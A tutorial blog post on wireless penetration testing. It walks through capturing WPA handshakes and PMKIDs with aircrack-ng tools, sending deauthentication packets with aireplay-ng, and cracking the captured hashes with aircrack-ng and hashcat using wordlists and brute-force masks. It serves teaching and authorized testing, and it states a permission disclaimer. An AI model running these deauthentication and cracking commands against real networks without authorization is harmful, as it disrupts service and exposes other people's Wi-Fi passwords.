---
layout: post
title: "Wireless Pentesting with Aircrack - 2025 Update"
categories: guide
author:
- th4ntis
---

This will be a walkthrough used to obtain wireless handshakes and [PMKID](https://hashcat.net/forum/thread-7717.html) using [Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) and crack it using [Hashcat](https://github.com/hashcat/hashcat) 

***

# **This is for educational purposes and only to be performed on networks you have permission to do so.**

***

My notes on Wireless in general can be found [here](https://cybersec.th4ntis.com/networking/wireless).

My notes on Hashcat can be found [here](https://cybersec.th4ntis.com/tools/hash-cracking/hashcat).

This will require having a WiFi Adapter that supports monitor mode, also known as packet injection.

I myself have and recommend these adapters:

* [Alfa AWUS036ACM](https://www.amazon.com/Alfa-AWUS036ACM-Long-Range-Dual-Band-Wireless/dp/B073X6RL9D) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACHM](https://www.amazon.com/gp/product/B08SJBV1N3/ref=ox\_sc\_act\_title\_1?smid=A20G3A026MV70R\&psc=1) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACH](https://www.amazon.com/dp/B08SJC78FH?ref\_=cm\_sw\_r\_cp\_ud\_dp\_PSZZG6J9X0XH40GXB685) <-- Capable of 2.4GHz and 5GHz (This more than likely \*will\* require driver installation)
* [Panda Wireless PAU09 N600](https://www.amazon.com/Panda-Wireless-PAU09-Adapter-Antennas/dp/B01LY35HGO) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036NEH](https://www.amazon.com/AWUS036NEH-Range-WIRELESS-802-11b-USBAdapter/dp/B0035OCVO6)
* [Alfa AWUS036NH](https://www.amazon.com/Alfa-AWUS036NH-802-11g-Wireless-Long-Range/dp/B003YIFHJY)
* [Panda Wireless PAU05](https://www.amazon.com/Panda-300Mbps-Wireless-USB-Adapter/dp/B00EQT0YK2)
* [TP-Link TL-WN722N](https://www.amazon.com/TP-Link-TL-WN722N-Wireless-network-Adapter/dp/B002SZEOLG)
* [Ralink USB WiFi RT5370](https://www.amazon.com/Ralink-RT5370-Raspberry-Adapter-Function/dp/B019XUDHFC)

# Aircrack-ng

Find your interface. If you have one network card(capable of monitor mode/packet injection) it will be `wlan0`, but if you have a second wireless USB dongle, it will most likely be `wlan1`.

```
iwconfig
```

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1059).png" alt=""><figcaption></figcaption></figure>


Put interface into monitor mode

```shell-session
sudo airmon-ng start wlan1
```

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1060).png" alt=""><figcaption></figcaption></figure>

Now we start scanning for networks doing some recon.

```
sudo airodump-ng wlan1mon
```

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1062).png" alt=""><figcaption></figcaption></figure>

Once we have found our target(s), we press `CTRL+C` to stop the scan

Now we focus our scan onto our target

```
sudo airodump-ng wlan1mon -c CH# --essid "SSID" -w outfile
```

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1063).png" alt=""><figcaption></figcaption></figure>

We can name the .cap file whatever we want, I typically just name it the targets SSID

Now we can see here at the bottom, we see `BSSID`, `STATION`, `PWR`, `Rate`, `Lost`, etc. this indicates if a device is connected to that network. This may not _always_ show devices but is helpful to keep an eye on.

At this point we can simply wait for a device to connect to the network to obtain the handshake, or we send deauth packets to the network to force a device to reconnect to the network to obtain the handshake. We can do this in various ways.

In a second terminal we will send 10 deauthentication packets to the network and stop.

```
sudo aireplay-ng -0 10 -a BSSID wlan1mon
```

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1064).png" alt=""><figcaption></figcaption></figure>

We can also deauthenticate a specific device that is connected to the network with

```
sudo aireplay-ng -0 10 -a BSSID -c STATION wlan1mon
```

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1065).png" alt=""><figcaption></figcaption></figure>

Once we have obtained the handshake, we will see our airodump terminal change, it will specify in the top right with `WPA Handshake: BSSID`.

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1066).png" alt=""><figcaption></figcaption></figure>

Note: We can also obtain PMKID with this method as well if the AP is vulnerable to that attack.

This is handshake is saved into the .cap file we specified we when target our airodump-ng scan. Once we have a handshake from aircrack, we will want to turn it into a hashcat compatible file. First we want to extract the handshake from the .cap file

<pre><code><strong>sudo aircrack-ng -j handshake capture.cap
</strong></code></pre>

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(4)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

OR using HCXDumptool

```
sudo hcxpcapngtool -o SSIDHash outfile.cap
```

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1067).png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(1068).png" alt=""><figcaption></figcaption></figure>

# Hash Cracking

So we now have our handshake in .cap format, we can crack the hash and find out the password.

## Aircrack

We'll start with `aircrack-ng` as that is what we originally captured our handshake with. When we chose the `-w` output with the SSID name, or whatever name you chose, the files are saved in whatever directory you ran that `airodump-ng` command from. You may have multiple files in there with that SSID name. Eg. `Pixel.cap-01.cap`, `Pixel.cap-02.cap`, `Pixel.cap-03.cap`, etc. The handshake _SHOULD_ be in the most recent one, the one with the highest number. So lets run aircrack against that .cap file.

`sudo aircrack-ng -w (wordlist) (.cap file)`

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(357).png)

Now depending on the password and the dictionary you chose, this may take some time. I chose to attack my phones hotspot as I am allowed to attack my own devices and made the password simple enough that the basic rockyou.txt file could crack it with ease. Once it has found it the cracking will stop and will tell you the password.

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(602).png)

## Hashcat

We have our PMKID in the .pcapng format, we can use hashcat to crack it. First we must use the `hcxpcapng` tool from [HCXtools](https://github.com/ZerBea/hcxtools).

hcxpcapng -o CrackMe (.pcapng file)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(721).png)

### Dictionary

If we want to use a dictionary attack, like using `rockyou.txt` for example

`hashcat -a 0 -w 3 -m 22000 (hash file) (wordlist)`

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(326).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(524).png)

Depending on your hardware, the dictionary you chose, and the password, this may take some time. You can press S for a status to see the time time estimated on finishing, as well as the updated "Recovered.Total" to see the recovered keys"

We can run the same command again with --show appended to the end to see our cracked passwords.

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(255).png)

### Brute Force

If we wanted to run a brute force attack rather than a dictionary attack, it's a similar command

`hashcat -a 3 -w 3 -m 22000 (hash file) '?l?l?l?l?l?l?l'`

Replace the `?l` with whatever we deem fit.
```
* ?l = a-z
* ?u = A-Z
* ?d = 0-9
* ?h = 0-9a-f
* ?H = 0-9A-F
* ?s = !"#$%&'()\*+,-./:;<=>?@\[]^\_\`{|}\~
* ?a = ?l?u?d?s
* ?b = 0x00 - 0xff
```
This will cover the basics of the hash cracking with hashcat but it can get SO much more advanced with hashcat. Especially when using rules like [OneRuleToRuleThemAllStill](https://github.com/stealthsploit/OneRuleToRuleThemStill) and modern wordlists like [rockyou2021.txt](https://chris.partridge.tech/2021/rockyou2021.txt-a-short-summary/).
